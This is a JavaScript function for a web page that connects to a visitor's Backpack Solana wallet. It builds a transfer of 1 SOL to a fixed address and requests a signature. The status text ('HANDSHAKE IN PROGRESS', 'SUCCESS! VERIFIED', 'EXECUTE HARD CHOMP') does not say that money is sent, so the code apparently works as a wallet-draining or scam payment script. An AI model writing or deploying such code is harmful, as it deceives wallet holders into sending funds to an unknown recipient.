async function ultimateChomp() {
    const log = document.getElementById('status');
    const btn = document.getElementById('mainBtn');
    const provider = window.backpack;

    if (btn.disabled) return; // Dubbele beveiliging

    try {
        btn.disabled = true;
        btn.innerText = "CHOMPING...";
        log.innerHTML = "STATUS: HANDSHAKE IN PROGRESS...";
        
        await provider.connect();

        const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: provider.publicKey,
                toPubkey: new solanaWeb3.PublicKey("BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq"),
                lamports: 1.0 * 1e9
            })
        );

        log.innerHTML = "STATUS: AWAITING_APPROVAL...";
        const result = await provider.signAndSendTransaction(tx);
        
        log.innerHTML = "SUCCESS! VERIFIED<br>ID: " + result.signature.substring(0,20);

    } catch (err) {
        if (err.message.includes('closed')) {
            log.innerHTML = "INTERRUPT: WALLET IS BUSY<br>WAIT 3 SECONDS AND TRY AGAIN.";
        } else {
            log.innerHTML = "ERROR: " + err.message.toUpperCase();
        }
    } finally {
        // We houden de knop 5 seconden dicht voor absolute veiligheid
        let countdown = 5;
        const timer = setInterval(() => {
            btn.innerText = `WAIT (${countdown}s)`;
            countdown--;
            if (countdown < 0) {
                clearInterval(timer);
                btn.disabled = false;
                btn.innerText = "EXECUTE HARD CHOMP";
            }
        }, 1000);
    }
}
